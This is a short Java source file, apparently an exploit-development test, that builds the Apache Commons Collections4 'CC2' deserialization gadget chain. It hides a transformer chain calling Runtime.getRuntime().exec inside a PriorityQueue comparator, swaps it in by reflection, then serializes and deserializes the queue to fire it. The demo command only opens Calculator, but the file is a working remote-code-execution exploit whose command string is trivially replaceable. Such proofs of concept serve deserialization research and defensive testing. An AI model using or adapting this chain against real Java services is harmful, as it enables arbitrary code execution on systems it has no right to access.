package Test_CC;

import expUtils.ExpUtils;
import expUtils.ReflectUtils;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;
import java.util.PriorityQueue;

public class Test_CC2 {



    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {


        Templates templates =  ExpUtils.getEvilTemplates();
        InvokerTransformer transformer = new InvokerTransformer("toString",new Class[0],new Object[0]);
        String cmd = "/System/Applications/Calculator.app/Contents/MacOS/Calculator";
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        PriorityQueue priorityQueue = new PriorityQueue(2,new TransformingComparator((chainedTransformer) ));
        priorityQueue.add(1);
        priorityQueue.add(1);



        ReflectUtils.setFields(chainedTransformer,"iTransformers",transformers);
//        Field queue =   ReflectUtils.getFields(priorityQueue,"queue");
//        Object[] objects = (Object[]) queue.get(priorityQueue);
//        objects[0] = 1;
//        objects[1] = 1;

        String path = ExpUtils.serialize(priorityQueue);
        ExpUtils.unserialize(path);


    }
}
